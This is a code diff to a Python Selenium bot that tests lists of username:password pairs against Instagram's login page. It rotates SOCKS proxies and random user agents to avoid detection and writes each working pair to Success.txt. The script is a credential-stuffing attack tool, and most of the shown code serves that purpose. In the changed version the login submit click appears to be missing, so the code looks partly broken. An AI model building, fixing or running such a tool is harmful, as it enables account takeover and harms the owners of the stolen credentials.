@@ -12,6 +12,7 @@ from fake_useragent import UserAgent
 
 
 socks = []
+w_file = open("Success.txt", 'w+')
 
 socks_4f = input("What is the Socks file?(N: FOR NO SOCKS)")
 if socks_4f != 'N':
@@ -25,58 +26,58 @@ m = 0
 
 class InstaBot:
     def __init__(self, username, password, i, socks_4f, socks_proxy):
-        try:
-            if socks_4f != 'N':
-                options = Options()
-                options.add_argument('--proxy-server=socks5://{}'.format(socks_proxy.strip()))
-                options.add_argument("start-maximized")
-                ua = UserAgent()
-                user_agent = ua.random
-                options.add_argument(f'user-agent={user_agent}')
-                driver = webdriver.Chrome( "/home/robert/Desktop/chromedriver",chrome_options = options)
-                driver.implicitly_wait(0.6)
-                driver.get(
-                    "https://www.instagram.com/accounts/login")
-                time.sleep(getRandomTime())
-                driver.implicitly_wait(10)
-                driver.find_element_by_xpath(
-                    "//input[@name=\"username\"]").send_keys(username)
-                driver.find_element_by_xpath(
-                    "//input[@name=\"password\"]").send_keys(password)
+        if socks_4f != 'N':
+            options = Options()
+            options.add_argument(
+                '--proxy-server=socks5://{}'.format(socks_proxy.strip()))
+            options.add_argument("start-maximized")
+            ua = UserAgent()
+            user_agent = ua.random
+            options.add_argument(f'user-agent={user_agent}')
+            driver = webdriver.Chrome(
+                "C:\\Users\\lavon\\Desktop\\Chrome\\chromedriver", chrome_options=options)
+            driver.implicitly_wait(0.6)
+            driver.get(
+                "https://www.instagram.com/accounts/login")
+            time.sleep(getRandomTime())
+            driver.implicitly_wait(10)
+            driver.find_element_by_xpath(
+                "//input[@name=\"username\"]").send_keys(username)
+            driver.find_element_by_xpath(
+                "//input[@name=\"password\"]").send_keys(password)
 
-                driver.find_element_by_xpath(
-                    '//button[@type="submit"]').click()
+            time.sleep(getRandomTime())
 
-            if socks_4f == 'N':
-                driver = webdriver.Chrome(
-                    "/home/robert/Desktop/chromedriver")
-                driver.implicitly_wait(0.6)
-                driver.get("https://www.instagram.com/accounts/login/")
-                time.sleep(getRandomTime())
-                driver.find_element_by_xpath(
-                    "//input[@name=\"username\"]").send_keys(username)
-                driver.find_element_by_xpath(
-                    "//input[@name=\"password\"]").send_keys(password)
+            try:
+                function_success(driver, username, password, w_file)
+            except Exception:
+                print("Unsuccessful login")
 
-                time.sleep(getRandomTime())
-                driver.find_element_by_xpath(
-                    '//button[@type="submit"]').click()
-        except Exception:
-            print("Possible Proxy Error")
+        if socks_4f == 'N':
+            driver = webdriver.Chrome(
+                "C:\\Users\\lavon\\Desktop\\Chrome\\chromedriver")
+            driver.implicitly_wait(0.6)
+            driver.get("https://www.instagram.com/accounts/login/")
+            time.sleep(getRandomTime())
+            driver.find_element_by_xpath(
+                "//input[@name=\"username\"]").send_keys(username)
+            driver.find_element_by_xpath(
+                "//input[@name=\"password\"]").send_keys(password)
+
+            time.sleep(getRandomTime())
+
+            try:
+                function_success(driver, username, password, w_file)
+            except Exception:
+                print("Unsuccessful login")
 
 
-try:
-    time.sleep(getRandomTime())
-    print(username, ":", password, "IS A SUCCESS!")
+def function_success(driver, username, password, w_file):
     driver.find_element_by_xpath(
-        "//button[contains(text(), 'Not Now')]").click()
-
-    time.sleep(getRandomTime())
-
+        "//button[normalize-space()='Not Now']").click()
+    print(username, ":", password, "IS A SUCCESS!")
+    w_file.write(username + ":" + password+ "\n")
     driver.quit()
-
-except Exception:
-    print("STARTING")
 
 
 def getRandomTime():
@@ -99,7 +100,6 @@ for line in r_file:
     if socks_4f == 'N':
         socks_proxy = str(socks)
         InstaBot(User, Password, i, socks_4f, socks_proxy)
-    print("\n<Error Wrong Login>")
     if socks_4f != 'N':
         if i == len(socks) - 1:
             print("Recycling Socks")
